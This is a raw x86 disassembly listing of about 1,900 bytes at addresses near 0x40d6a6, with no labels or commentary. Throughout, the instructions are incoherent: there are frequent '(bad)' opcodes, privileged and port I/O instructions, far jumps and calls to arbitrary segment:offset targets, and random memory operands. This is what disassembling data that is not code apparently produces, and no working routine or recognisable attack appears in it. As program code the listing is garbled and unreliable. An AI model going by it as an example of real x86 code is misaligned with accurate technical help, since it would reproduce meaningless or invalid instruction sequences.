  40d6a6:	mov    ebp,0xe965e799
  40d6ab:	pop    ebp
  40d6ac:	jle    0x40d662
  40d6ae:	sbb    dh,BYTE PTR [esi-0x4a7f5283]
  40d6b4:	pop    esp
  40d6b5:	rcr    DWORD PTR [ebx+0x53e0f7a6],0x46
  40d6bc:	mov    ch,0xf8
  40d6be:	sub    DWORD PTR [edi-0x2e0c0152],edi
  40d6c4:	mov    ss,edi
  40d6c6:	cs aas 
  40d6c8:	mov    esi,ebp
  40d6ca:	xchg   edx,eax
  40d6cb:	push   ss
  40d6cc:	es ja  0x40d692
  40d6cf:	add    al,0xb2
  40d6d1:	or     DWORD PTR gs:[ecx-0x40bd0364],eax
  40d6d8:	mov    ds:0x291f28c9,eax
  40d6dd:	mov    eax,ds:0xe6de4748
  40d6e2:	inc    ebp
  40d6e3:	rcl    DWORD PTR [eax+eax*8],0x9a
  40d6e7:	stos   DWORD PTR es:[edi],eax
  40d6e8:	std    
  40d6e9:	ret    
  40d6ea:	jns    0x40d725
  40d6ec:	sub    cl,BYTE PTR ds:0x8a745eb5
  40d6f2:	out    dx,eax
  40d6f3:	inc    esi
  40d6f4:	mov    dl,0xa8
  40d6f6:	pop    esi
  40d6f7:	cmp    al,0xaf
  40d6f9:	and    dl,BYTE PTR [edx+ecx*1]
  40d6fc:	xlat   BYTE PTR ds:[ebx]
  40d6fd:	mov    edx,0x835c78ce
  40d702:	push   edx
  40d703:	sub    esi,ebp
  40d705:	or     dh,BYTE PTR [ecx+0x1a]
  40d708:	std    
  40d709:	pop    ecx
  40d70a:	sbb    ch,BYTE PTR [edx+0x4a]
  40d70d:	scas   eax,DWORD PTR es:[edi]
  40d70e:	stc    
  40d70f:	mov    ds,WORD PTR [ebp-0x16f81d79]
  40d715:	das    
  40d716:	repnz sbb al,0x8d
  40d719:	lock sti 
  40d71b:	retf   
  40d71c:	mov    ebx,0x9e8fc0df
  40d721:	xchg   DWORD PTR [edx+0x582d156f],ebp
  40d727:	mov    edx,0x90e0b56b
  40d72c:	xor    ecx,esp
  40d72e:	pop    edx
  40d72f:	cld    
  40d730:	bound  ebp,QWORD PTR [edi-0x27]
  40d733:	jmp    0x758c8937
  40d738:	mov    edi,eax
  40d73a:	fcmovnb st,st(6)
  40d73c:	mov    bh,0xe8
  40d73e:	push   0x38
  40d740:	out    dx,al
  40d741:	test   al,0x23
  40d743:	xor    ebx,DWORD PTR [edi+ebp*8+0x2e0fb3a]
  40d74a:	cld    
  40d74b:	xchg   BYTE PTR [ebx-0x6b728dfe],ah
  40d751:	neg    DWORD PTR [edx]
  40d753:	lods   eax,DWORD PTR ds:[esi]
  40d754:	sub    edi,ebp
  40d756:	cmp    DWORD PTR [edi+0x26],edi
  40d759:	daa    
  40d75a:	pop    ebp
  40d75b:	mov    al,ds:0xafe4ddc4
  40d760:	jb     0x40d6ea
  40d762:	sbb    al,0x2a
  40d764:	lods   al,BYTE PTR ds:[esi]
  40d765:	jecxz  0x40d7a6
  40d767:	jp     0x40d746
  40d769:	push   0xfd92eef4
  40d76e:	push   ss
  40d76f:	dec    ebp
  40d770:	imul   ecx,DWORD PTR [esi-0xb],0x6f
  40d774:	jl     0x40d70c
  40d776:	inc    ebx
  40d777:	or     al,0xca
  40d779:	and    ebx,ebp
  40d77b:	dec    edx
  40d77c:	fwait
  40d77d:	nop/reserved BYTE PTR [edi+edi*4+0x7c51c365]
  40d785:	stos   DWORD PTR es:[edi],eax
  40d786:	cmp    DWORD PTR [edx],esi
  40d788:	sbb    DWORD PTR [ebp+0x727823c9],ebp
  40d78e:	push   edx
  40d78f:	and    BYTE PTR [eax+eax*2],ah
  40d792:	loop   0x40d766
  40d794:	in     eax,0xa8
  40d796:	xor    cl,BYTE PTR [edi+0x61f17bcd]
  40d79c:	push   edi
  40d79d:	cdq    
  40d79e:	call   0x4b20:0x97ec9768
  40d7a5:	add    bh,ch
  40d7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a8:	xchg   ebx,eax
  40d7a9:	inc    ebp
  40d7aa:	mov    fs,WORD PTR [edx-0x11]
  40d7ad:	sti    
  40d7ae:	repnz sub DWORD PTR [esi],edx
  40d7b1:	call   0x4632:0x479d8257
  40d7b8:	test   eax,0x64420575
  40d7bd:	mov    al,ch
  40d7bf:	xchg   edi,esi
  40d7c1:	mov    ebp,0xa37b2a62
  40d7c6:	gs xchg ebx,eax
  40d7c8:	push   edi
  40d7c9:	js     0x40d76f
  40d7cb:	xor    BYTE PTR [eax],al
  40d7cd:	shl    DWORD PTR [ebx+0x678103c3],0x38
  40d7d4:	pop    esp
  40d7d5:	mov    eax,0x1923d979
  40d7da:	or     esp,DWORD PTR [ecx+0x5c]
  40d7dd:	xchg   ebx,eax
  40d7de:	pop    ebx
  40d7df:	mov    ecx,0x78570ff5
  40d7e4:	hlt    
  40d7e5:	add    DWORD PTR [eax+eax*8+0x6f],ebx
  40d7e9:	lahf   
  40d7ea:	cmc    
  40d7eb:	stc    
  40d7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ed:	daa    
  40d7ee:	xlat   BYTE PTR ds:[ebx]
  40d7ef:	out    0xe5,al
  40d7f1:	push   edi
  40d7f2:	mov    dh,BYTE PTR ds:0xb090f441
  40d7f8:	add    ch,BYTE PTR [eax+0x47155940]
  40d7fe:	push   esp
  40d7ff:	xor    DWORD PTR [esi],ebp
  40d801:	data16 and al,0x71
  40d804:	adc    DWORD PTR [edi],eax
  40d806:	clc    
  40d807:	pop    es
  40d808:	cmp    esi,DWORD PTR [ebx]
  40d80a:	adc    DWORD PTR ds:0x7a90797b,edx
  40d810:	mov    al,ds:0x2753a14a
  40d815:	add    al,0xf0
  40d817:	adc    al,0xa
  40d819:	jmp    0xac6:0xa465cdab
  40d820:	fnstsw WORD PTR [ebx+0x24edb9f0]
  40d826:	cmp    ecx,DWORD PTR [edi-0x13]
  40d829:	jg     0x40d87d
  40d82b:	sbb    al,0xe4
  40d82d:	inc    ebp
  40d82e:	es nop
  40d830:	test   al,0x4a
  40d832:	shl    DWORD PTR [ebp+0x16],0x96
  40d836:	lock enter 0xda7d,0x2d
  40d83b:	cmp    bh,cl
  40d83d:	and    DWORD PTR [edx-0x27],esp
  40d840:	push   edx
  40d841:	mov    ebp,DWORD PTR [eax+eax*8-0xc166123]
  40d848:	mov    ecx,ebp
  40d84a:	fist   DWORD PTR [eax-0x42]
  40d84d:	stos   BYTE PTR es:[edi],al
  40d84e:	sti    
  40d84f:	pusha  
  40d850:	xchg   esi,eax
  40d851:	pop    ebp
  40d852:	push   eax
  40d853:	popf   
  40d854:	sahf   
  40d855:	lods   al,BYTE PTR ds:[esi]
  40d856:	jne    0x40d87d
  40d858:	lods   al,BYTE PTR ds:[esi]
  40d859:	push   ebp
  40d85a:	lods   al,BYTE PTR ds:[esi]
  40d85b:	stos   DWORD PTR es:[edi],eax
  40d85c:	mov    ah,0x16
  40d85e:	dec    ecx
  40d85f:	inc    esi
  40d860:	repz xchg edi,eax
  40d862:	or     DWORD PTR [eax-0xd],0x4
  40d866:	gs push cs
  40d868:	sahf   
  40d869:	xacquire xchg DWORD PTR [ecx-0x7c],ebx
  40d86d:	rdtsc  
  40d86f:	or     bh,BYTE PTR [eax-0x3d]
  40d872:	pop    ss
  40d873:	add    edx,ebx
  40d875:	mov    ecx,0x577eedb4
  40d87a:	repz dec DWORD PTR [edx+0x7b]
  40d87e:	test   eax,0x327ad803
  40d883:	jae    0x40d89c
  40d885:	in     eax,dx
  40d886:	xor    cl,ch
  40d888:	mov    al,ds:0x3021c9e4
  40d88d:	retf   0x431
  40d890:	es jge 0x40d8b9
  40d893:	jg     0x40d859
  40d895:	pop    ebp
  40d896:	cld    
  40d897:	(bad)  
  40d898:	push   ss
  40d899:	mov    cr0,ebx
  40d89c:	xor    edx,eax
  40d89e:	xchg   ecx,eax
  40d89f:	inc    esp
  40d8a0:	jae    0x40d825
  40d8a2:	ins    BYTE PTR es:[edi],dx
  40d8a3:	out    dx,eax
  40d8a4:	and    dh,BYTE PTR [ebp+0x65]
  40d8a7:	scas   al,BYTE PTR es:[edi]
  40d8a8:	sahf   
  40d8a9:	in     al,0xcf
  40d8ab:	jle    0x40d90d
  40d8ad:	bound  ecx,QWORD PTR [ebx]
  40d8af:	fbld   TBYTE PTR [ebp+0x6770bdb0]
  40d8b5:	mov    eax,ds:0xf73c4723
  40d8ba:	outs   dx,BYTE PTR ds:[esi]
  40d8bb:	test   BYTE PTR [ecx+0x72172631],0x8e
  40d8c2:	mov    fs,WORD PTR [ebx+0x1d]
  40d8c5:	sub    BYTE PTR [esi+0x6e8bb945],bh
  40d8cb:	out    dx,eax
  40d8cc:	xor    ah,BYTE PTR [eax]
  40d8ce:	hlt    
  40d8cf:	mov    ecx,0x617f8a65
  40d8d4:	push   esi
  40d8d5:	ins    DWORD PTR es:[edi],dx
  40d8d6:	je     0x40d8f3
  40d8d8:	cmc    
  40d8d9:	test   eax,0x90b8f9a7
  40d8de:	call   0xb2722bc0
  40d8e3:	mov    bh,0x89
  40d8e5:	fwait
  40d8e6:	adc    eax,0x5949fdc8
  40d8eb:	mov    dl,0x1b
  40d8ed:	add    BYTE PTR [ebx+0x30],0x5c
  40d8f1:	xchg   esp,eax
  40d8f2:	or     dh,ah
  40d8f4:	ds xchg esi,eax
  40d8f6:	scas   al,BYTE PTR es:[edi]
  40d8f7:	sub    DWORD PTR [ebp-0x75a5dc34],ebp
  40d8fd:	dec    ebp
  40d8fe:	stos   BYTE PTR es:[edi],al
  40d8ff:	pop    edi
  40d900:	mov    eax,ds:0x3c740ef5
  40d905:	inc    esp
  40d906:	loopne 0x40d965
  40d908:	cmp    edi,DWORD PTR [edi+ebx*8-0x5b]
  40d90c:	sub    BYTE PTR [esi+0x5f3eb894],ah
  40d912:	sbb    ah,BYTE PTR [ebp+0x72c32dd3]
  40d918:	into   
  40d919:	repnz fsubr QWORD PTR [ebx+0x6b097562]
  40d920:	or     BYTE PTR [eax-0x4],ah
  40d923:	inc    ecx
  40d925:	dec    ebp
  40d926:	inc    eax
  40d927:	cmp    eax,0xc31601ef
  40d92c:	outs   dx,DWORD PTR ds:[esi]
  40d92d:	mov    gs,WORD PTR [esi]
  40d92f:	or     al,0x11
  40d931:	mov    ds:0x1053d98a,al
  40d936:	test   BYTE PTR [ebx+0x28],dh
  40d939:	push   0xfffffff8
  40d93b:	in     eax,dx
  40d93c:	or     bh,BYTE PTR ds:0x12c5115d
  40d942:	scas   al,BYTE PTR es:[edi]
  40d943:	mov    esi,eax
  40d945:	test   eax,0xb6594bf2
  40d94a:	mov    al,0x15
  40d94c:	retf   
  40d94d:	mov    WORD PTR [ecx-0x36],?
  40d950:	adc    BYTE PTR [eax],dl
  40d952:	pop    es
  40d953:	out    0x8b,eax
  40d955:	imul   ebp,esi,0xbbe6fcab
  40d95b:	repnz repnz outs dx,BYTE PTR ds:[esi]
  40d95e:	popa   
  40d95f:	int    0xbf
  40d961:	dec    edx
  40d962:	mov    edx,0xfe0c9739
  40d967:	mov    ebp,0xabd234a3
  40d96c:	adc    eax,0x260564ff
  40d971:	cs (bad) 
  40d974:	jno    0x40d9c6
  40d976:	inc    esp
  40d977:	arpl   WORD PTR [esi+0x52],bp
  40d97a:	mov    ds:0xcece8b18,al
  40d97f:	jb     0x40d977
  40d981:	loopne 0x40d97d
  40d983:	xchg   ecx,eax
  40d984:	and    ch,BYTE PTR [ebp+0x61]
  40d987:	shr    DWORD PTR [eax],cl
  40d989:	shl    DWORD PTR ds:0x1c9d81a1,0x2f
  40d990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d991:	mov    ch,0x20
  40d993:	inc    esi
  40d994:	xor    DWORD PTR [ecx],ebp
  40d996:	mov    eax,0x46864736
  40d99b:	xor    ebp,ebx
  40d99d:	lahf   
  40d99e:	mov    WORD PTR [eax+0x7f733b18],es
  40d9a4:	dec    ebx
  40d9a5:	sub    al,0x8c
  40d9a7:	jecxz  0x40da0d
  40d9a9:	test   eax,0x93e7ae5f
  40d9ae:	pop    esp
  40d9af:	fistp  QWORD PTR [ebx]
  40d9b1:	ror    BYTE PTR cs:[ebx-0x6c],1
  40d9b5:	jp     0x40d9b5
  40d9b7:	mov    ch,0xd5
  40d9b9:	shl    cl,1
  40d9bb:	and    eax,0x2a5f7a2c
  40d9c0:	add    eax,DWORD PTR [ecx+esi*8-0x80]
  40d9c4:	das    
  40d9c5:	scas   al,BYTE PTR es:[edi]
  40d9c6:	test   eax,0x2f1d185a
  40d9cb:	cmp    ebp,edx
  40d9cd:	int3   
  40d9ce:	jge    0x40da29
  40d9d0:	push   esi
  40d9d1:	mov    ds:0xdf428981,eax
  40d9d6:	sbb    al,0x52
  40d9d8:	inc    ebx
  40d9d9:	enter  0x6ee0,0xd9
  40d9dd:	dec    edx
  40d9de:	sbb    BYTE PTR [esi+0x5f],cl
  40d9e1:	xor    bl,ah
  40d9e3:	inc    edi
  40d9e4:	xchg   ecx,eax
  40d9e5:	add    DWORD PTR [eax],ebx
  40d9e7:	push   edx
  40d9e8:	sbb    eax,edi
  40d9ea:	sahf   
  40d9eb:	xchg   esp,eax
  40d9ec:	jl     0x40da2c
  40d9ee:	in     al,0xeb
  40d9f0:	aaa    
  40d9f1:	inc    edi
  40d9f2:	inc    ecx
  40d9f3:	xlat   BYTE PTR ds:[ebx]
  40d9f4:	push   cs
  40d9f5:	ret    0x839
  40d9f8:	adc    eax,0xe9294a06
  40d9fd:	(bad)  
  40d9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ff:	adc    cl,ch
  40da01:	push   0xfffffff5
  40da03:	lahf   
  40da04:	and    DWORD PTR [edi+0x10ecdda8],esp
  40da0a:	test   eax,0xb1bee0eb
  40da0f:	stc    
  40da10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da11:	mov    ds:0x9a8fc5af,eax
  40da16:	add    eax,0x19251ad
  40da1b:	gs push edi
  40da1d:	cmp    edi,esi
  40da1f:	mov    edx,0x775c8e5a
  40da24:	dec    ebx
  40da25:	ret    0xeef9
  40da28:	aad    0xaf
  40da2a:	js     0x40da15
  40da2c:	fisubr DWORD PTR [ebx+0x3eb3df9d]
  40da32:	dec    edx
  40da33:	scas   al,BYTE PTR es:[edi]
  40da34:	jb     0x40d9ee
  40da36:	imul   ebx,edx,0xffffff83
  40da39:	mov    bh,0x47
  40da3b:	ror    BYTE PTR [edx-0x32],cl
  40da3e:	test   DWORD PTR [esp+eax*2-0x3043aa45],0x33d4be29
  40da49:	push   ebx
  40da4a:	int    0xf8
  40da4c:	push   0x2f477f0a
  40da51:	jns    0x40dac5
  40da53:	rol    BYTE PTR [edi],0x5
  40da56:	and    eax,0x33778cb2
  40da5b:	pop    ebx
  40da5c:	jge    0x40daa3
  40da5e:	mov    DWORD PTR [esi-0x68f696d],0x523d7b4e
  40da68:	scas   al,BYTE PTR es:[edi]
  40da69:	mov    edi,0xd7ccd3a0
  40da6e:	retf   0xfaf2
  40da71:	jecxz  0x40dacb
  40da73:	add    al,0x44
  40da75:	mov    al,bl
  40da77:	adc    eax,0x75285931
  40da7c:	and    eax,0x3529a44f
  40da81:	mov    ecx,0xa19939c0
  40da86:	sbb    eax,0xe8878a72
  40da8b:	mov    fs,WORD PTR [esi+0x57]
  40da8e:	js     0x40daaa
  40da90:	ja     0x40dac5
  40da92:	fild   WORD PTR [ebx-0x11a09aaf]
  40da98:	shl    DWORD PTR [ecx],0x8e
  40da9b:	outs   dx,DWORD PTR ds:[esi]
  40da9c:	adc    al,0xd6
  40da9e:	inc    esp
  40da9f:	iret   
  40daa0:	xchg   edi,eax
  40daa1:	xchg   edi,eax
  40daa2:	inc    ecx
  40daa3:	int    0xac
  40daa5:	daa    
  40daa6:	sub    eax,0x93d03936
  40daab:	pop    ebx
  40daac:	jno    0x40db12
  40daae:	mov    edx,0x46dafefd
  40dab3:	(bad)  
  40dab4:	leave  
  40dab5:	ins    BYTE PTR es:[edi],dx
  40dab6:	es std 
  40dab8:	cmp    esp,DWORD PTR [ecx-0x73]
  40dabb:	xchg   esp,eax
  40dabc:	lods   eax,DWORD PTR ds:[esi]
  40dabd:	inc    ecx
  40dabe:	cwde   
  40dabf:	jg     0x40dad4
  40dac1:	retf   0xa61f
  40dac4:	and    eax,DWORD PTR [ebp+0x48]
  40dac7:	push   ecx
  40dac8:	mov    ebx,0x87f9ba11
  40dacd:	pop    edi
  40dace:	dec    ebp
  40dacf:	sub    al,ch
  40dad1:	or     edi,edi
  40dad3:	push   esp
  40dad4:	aad    0xb0
  40dad6:	mov    esi,0x1a5458ce
  40dadb:	fidiv  DWORD PTR [eax+0x7b]
  40dade:	mov    ebx,0x42d5b113
  40dae3:	into   
  40dae4:	push   es
  40dae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae6:	aas    
  40dae7:	jmp    0xd28df4ee
  40daec:	jmp    0x7f0f:0x73b1d513
  40daf3:	mov    DWORD PTR [esi],edx
  40daf5:	jbe    0x40dadf
  40daf7:	stos   DWORD PTR es:[edi],eax
  40daf8:	mov    WORD PTR [esp+edi*8],es
  40dafb:	daa    
  40dafc:	add    bh,BYTE PTR [eax-0x3]
  40daff:	sub    BYTE PTR [edx-0x32937c13],al
  40db05:	popf   
  40db06:	pop    ebx
  40db07:	pop    DWORD PTR [ecx+0x267cf651]
  40db0d:	adc    bl,bl
  40db0f:	imul   ebx,DWORD PTR [edx-0x36],0x34
  40db13:	ss retf 
  40db15:	sbb    DWORD PTR [edx+0x40],ebx
  40db18:	es mov bh,0xbc
  40db1b:	enter  0xc1d9,0x3c
  40db1f:	dec    ecx
  40db20:	enter  0x6c8,0xe5
  40db24:	clc    
  40db25:	mov    bh,0xf5
  40db27:	das    
  40db28:	mov    edi,0xba53d683
  40db2d:	sub    ecx,DWORD PTR ss:[ecx]
  40db30:	pusha  
  40db31:	add    DWORD PTR [edx],0x67140628
  40db37:	xchg   ecx,eax
  40db38:	(bad)  
  40db39:	mov    esi,0xff85b4f7
  40db3e:	mov    es,WORD PTR [eax+0x7c]
  40db41:	push   0xffffffeb
  40db43:	jge    0x40dad8
  40db45:	shl    BYTE PTR [esp+eax*2+0x303a2417],cl
  40db4c:	rol    DWORD PTR [edi+0x79],1
  40db4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db50:	lea    eax,[ebx]
  40db52:	sbb    BYTE PTR [edi-0x6c],bl
  40db55:	pop    esi
  40db56:	in     eax,dx
  40db57:	in     al,dx
  40db58:	lds    ebx,FWORD PTR [edi]
  40db5a:	daa    
  40db5b:	ds push es
  40db5d:	fdivrp st(0),st
  40db5f:	mov    edx,0xabe316ce
  40db64:	and    BYTE PTR [esi+0x78ad9a87],ah
  40db6a:	or     eax,0x46607a7d
  40db6f:	sub    eax,0x809db23d
  40db74:	adc    eax,0x23d4c229
  40db79:	loopne 0x40db7e
  40db7b:	ficom  WORD PTR [esi+0x3e]
  40db7e:	jmp    0x16c1ad53
  40db83:	mov    WORD PTR ds:[esp+edx*2-0x3c33b105],fs
  40db8b:	cdq    
  40db8c:	int3   
  40db8d:	aas    
  40db8e:	fnsave [edi]
  40db90:	test   eax,0x7adcbf93
  40db95:	mov    cl,0x9
  40db97:	fld    TBYTE PTR [edi-0x3d2a977a]
  40db9d:	ins    BYTE PTR es:[edi],dx
  40db9e:	xor    al,0x67
  40dba0:	fdivr  DWORD PTR [ebp+0x72]
  40dba3:	stos   BYTE PTR es:[edi],al
  40dba4:	fbstp  TBYTE PTR [edi-0xd31a5fa]
  40dbaa:	or     bl,ah
  40dbac:	or     DWORD PTR [edx+0x299b5433],edi
  40dbb2:	bound  ebp,QWORD PTR ds:0xe479feb5
  40dbb8:	retf   
  40dbb9:	adc    eax,0xf26572ba
  40dbbe:	xor    edx,ebx
  40dbc0:	lods   eax,DWORD PTR ds:[esi]
  40dbc1:	push   ss
  40dbc2:	fdiv   st,st(3)
  40dbc4:	xor    al,BYTE PTR [ebx-0x8c4e2ed]
  40dbca:	clc    
  40dbcb:	std    
  40dbcc:	jbe    0x40dbc2
  40dbce:	in     eax,dx
  40dbcf:	push   es
  40dbd0:	int3   
  40dbd1:	stos   BYTE PTR es:[edi],al
  40dbd2:	sub    ch,BYTE PTR [edi+0x6009e99c]
  40dbd8:	xchg   edx,eax
  40dbd9:	aam    0xbd
  40dbdb:	pop    ds
  40dbdc:	(bad)  [esp+eiz*8+0x16]
  40dbe0:	dec    ebp
  40dbe1:	arpl   WORD PTR [ebx+ebp*2+0x65fd9cad],bp
  40dbe8:	cmp    DWORD PTR [ecx-0x53],ecx
  40dbeb:	das    
  40dbec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbed:	push   esi
  40dbee:	cmc    
  40dbef:	add    eax,0xfdc4faff
  40dbf4:	xchg   DWORD PTR [ecx],esp
  40dbf6:	aas    
  40dbf7:	dec    esp
  40dbf8:	sbb    eax,0xfa37ef56
  40dbfd:	xchg   esi,eax
  40dbfe:	js     0x40dbfa
  40dc00:	(bad)  
  40dc03:	push   eax
  40dc04:	pusha  
  40dc05:	pop    es
  40dc06:	push   edx
  40dc07:	sub    al,bh
  40dc09:	cmp    bl,BYTE PTR [ecx-0xf]
  40dc0c:	ins    BYTE PTR es:[edi],dx
  40dc0d:	test   al,0x4b
  40dc0f:	aaa    
  40dc10:	push   cs
  40dc11:	iret   
  40dc12:	imul   esi,DWORD PTR ds:0x14511557,0xabf589d7
  40dc1c:	fisub  DWORD PTR [ebx-0x7]
  40dc1f:	mov    ebp,0x9ee17f00
  40dc24:	cmp    cl,cl
  40dc26:	inc    esp
  40dc27:	jmp    0xaa62:0x29dd1aa8
  40dc2e:	mov    ebx,DWORD PTR [ebp+0x9]
  40dc31:	pop    ss
  40dc32:	retf   
  40dc33:	inc    esi
  40dc34:	dec    ecx
  40dc35:	xor    DWORD PTR [edx+0x7387eba0],edi
  40dc3b:	sub    dl,bl
  40dc3d:	cwde   
  40dc3e:	mov    bl,0x4
  40dc40:	push   esp
  40dc41:	call   0xf31f:0x1f50a649
  40dc48:	int    0x6f
  40dc4a:	push   eax
  40dc4b:	pop    eax
  40dc4c:	push   0xffffffae
  40dc4e:	sbb    BYTE PTR ds:0x565ee0da,0xa3
  40dc55:	cmp    BYTE PTR [eax],dh
  40dc57:	jle    0x40dca2
  40dc59:	jbe    0x40dc37
  40dc5b:	call   0x1fd2:0x8bd7242d
  40dc62:	cmp    al,0xb
  40dc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc65:	mov    ebp,0xfc6c56c4
  40dc6a:	jns    0x40dcdc
  40dc6c:	cmp    ecx,DWORD PTR [ebx]
  40dc6e:	mov    esp,0x5ea5db91
  40dc73:	push   ecx
  40dc74:	popa   
  40dc75:	add    DWORD PTR [ebx+0xb],0x28c3a690
  40dc7c:	jmp    0x19e27f0c
  40dc81:	in     al,0x43
  40dc83:	je     0x40dc0a
  40dc85:	ja     0x40dcbb
  40dc87:	mov    ds:0x23e80d91,al
  40dc8c:	aaa    
  40dc8d:	shl    DWORD PTR [edx],cl
  40dc8f:	xor    eax,0xadf1bf92
  40dc94:	jae    0x40dced
  40dc96:	repnz repnz call 0x70fa:0xa5f057ba
  40dc9f:	in     eax,dx
  40dca0:	cwde   
  40dca1:	ffree  st(3)
  40dca3:	inc    esi
  40dca4:	mov    BYTE PTR [esi-0x50d07f4e],bl
  40dcaa:	ffree  st(5)
  40dcac:	and    ebx,DWORD PTR [edi]
  40dcae:	lock sbb cl,al
  40dcb1:	jp     0x40dc66
  40dcb3:	daa    
  40dcb4:	dec    esp
  40dcb5:	pop    edi
  40dcb6:	fisttp WORD PTR ds:0xb3d6668a
  40dcbc:	les    esp,FWORD PTR [ecx-0x43]
  40dcbf:	fsub   st(1),st
  40dcc1:	mov    edi,0x5bc4819b
  40dcc6:	sub    al,0x98
  40dcc8:	add    al,0x8a
  40dcca:	in     al,dx
  40dccb:	add    BYTE PTR [ebx+0x4a3f9efb],ch
  40dcd1:	(bad)  
  40dcd2:	int    0xf9
  40dcd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcd5:	push   cs
  40dcd6:	(bad)  
  40dcd7:	dec    ecx
  40dcd8:	mov    al,0x5f
  40dcda:	sbb    esp,ecx
  40dcdc:	xor    edx,0x3858e74e
  40dce2:	xchg   esi,eax
  40dce3:	mov    ds:0xa8bcdb25,al
  40dce8:	jne    0x40dc81
  40dcea:	dec    edi
  40dceb:	pop    esi
  40dcec:	mov    ch,0x8e
  40dcee:	or     BYTE PTR [esi+0x0],ch
  40dcf1:	stc    
  40dcf2:	cmp    ah,al
  40dcf4:	cmp    al,0x63
  40dcf6:	ror    BYTE PTR [ebx-0x714aa8b3],1
  40dcfc:	sub    eax,0xd80db40
  40dd01:	xor    edx,0xb6273e61
  40dd07:	push   edx
  40dd08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd0a:	icebp  
  40dd0b:	(bad)  
  40dd0c:	fadd   QWORD PTR [ebx]
  40dd0e:	mov    ds:0xba685775,eax
  40dd13:	repnz inc dl
  40dd16:	inc    eax
  40dd17:	inc    esp
  40dd18:	outs   dx,BYTE PTR ds:[esi]
  40dd19:	or     BYTE PTR [edx+eiz*2+0x28],cl
  40dd1d:	push   ds
  40dd1e:	sbb    edx,esp
  40dd20:	mov    ah,0x2c
  40dd22:	out    0xf9,eax
  40dd24:	imul   ch
  40dd26:	pop    esp
  40dd27:	pop    ecx
  40dd28:	test   al,0x50
  40dd2a:	mov    ch,0xfb
  40dd2c:	repnz adc BYTE PTR [esi-0x30754153],ch
  40dd33:	daa    
  40dd34:	les    esi,FWORD PTR [esi-0x63]
  40dd37:	add    dl,BYTE PTR [esi-0x6b]
  40dd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd3b:	cmc    
  40dd3c:	out    dx,al
  40dd3d:	xchg   esp,eax
  40dd3e:	sti    
  40dd3f:	push   eax
  40dd40:	jmp    0x40dd72
  40dd42:	add    al,0x4b
  40dd44:	sbb    al,0xea
  40dd46:	cdq    
  40dd47:	in     eax,dx
  40dd48:	out    dx,eax
  40dd49:	stos   BYTE PTR es:[edi],al
  40dd4a:	fsubr  st(0),st
  40dd4c:	mov    edx,0x71ddc5c2
  40dd51:	adc    al,0x69
  40dd53:	in     eax,dx
  40dd54:	ins    DWORD PTR es:[edi],dx
  40dd55:	xor    bh,BYTE PTR [edi+0x18656ce0]
  40dd5b:	nop
  40dd5c:	add    al,0x4b
  40dd5e:	ror    BYTE PTR [eax-0x7d0ea0d5],cl
  40dd64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd65:	adc    ch,BYTE PTR [edi-0x78]
  40dd68:	adc    eax,0xab0dc3d
  40dd6d:	ds jb  0x40dd5a
  40dd70:	jns    0x40dde5
  40dd72:	ret    
  40dd73:	mov    BYTE PTR [ebp-0x30610268],bh
  40dd79:	cmp    DWORD PTR [edi+ebp*1-0x7fa6ea7],edx
  40dd80:	aas    
  40dd81:	fwait
  40dd82:	in     al,0x6
  40dd84:	cmp    al,0x5b
  40dd86:	outs   dx,DWORD PTR ds:[esi]
  40dd87:	adc    eax,0xf18c933b
  40dd8c:	aaa    
  40dd8d:	scas   eax,DWORD PTR es:[edi]
  40dd8e:	sub    bh,BYTE PTR [eax+0x83889ba]
  40dd94:	inc    edi
  40dd95:	fwait
  40dd96:	pushf  
  40dd97:	fucomi st,st(3)
  40dd99:	scas   al,BYTE PTR es:[edi]
  40dd9a:	popa   
  40dd9b:	enter  0x7c6a,0x8f
  40dd9f:	xchg   edi,eax
  40dda0:	pop    ecx
  40dda1:	loopne 0x40dd3b
  40dda3:	cli    
  40dda4:	mov    esp,0xf64b1b55
  40dda9:	sbb    ch,BYTE PTR [eax]
  40ddab:	jmp    0x5306:0x80d32473
  40ddb2:	stos   BYTE PTR es:[edi],al
  40ddb3:	or     eax,0x87b1ce58
  40ddb8:	mov    ebp,0x3441f223
  40ddbd:	xchg   edx,eax
  40ddbe:	jmp    0x3c59:0x727f4a17
  40ddc5:	pop    edi
  40ddc6:	ds cwde 
  40ddc8:	fsub   st(1),st
  40ddca:	cmp    eax,0xadd74003
  40ddcf:	fisttp DWORD PTR [ebx-0x4e]
  40ddd2:	stos   DWORD PTR es:[edi],eax
  40ddd3:	mov    al,0xe
  40ddd5:	lea    ebp,[edx]
  40ddd7:	xchg   BYTE PTR [edx+0x8],al
  40ddda:	cmp    al,ch
  40dddc:	stos   DWORD PTR es:[edi],eax
  40dddd:	(bad)  
  40ddde:	call   0xbddc:0x65cfd5d7
  40dde5:	fcom   DWORD PTR [edx-0x41]
  40dde8:	push   ebp
  40dde9:	mov    dl,0xb1
  40ddeb:	xchg   esi,eax
  40ddec:	fistp  DWORD PTR [esi]
  40ddee:	gs lock sub al,0x57
  40ddf2:	stos   DWORD PTR es:[edi],eax
  40ddf3:	sub    esi,DWORD PTR [ecx+0x3a]
  40ddf6:	(bad)  
  40ddf8:	fwait
  40ddf9:	xor    al,0xff
  40ddfb:	es mov edi,0xfc3bc694
  40de01:	xor    ch,BYTE PTR [ecx-0x6cb18362]
  40de07:	sub    DWORD PTR [ebx],ecx
  40de09:	in     eax,dx
  40de0a:	pushf  
  40de0b:	xchg   edx,eax
  40de0c:	out    0xb3,eax
  40de0e:	les    ebp,FWORD PTR [edi+0x77ce2a9d]
  40de14:	sbb    al,0xd9
  40de16:	test   al,0x15
  40de18:	add    al,0x2a
  40de1a:	fwait
  40de1b:	or     eax,0x41906365
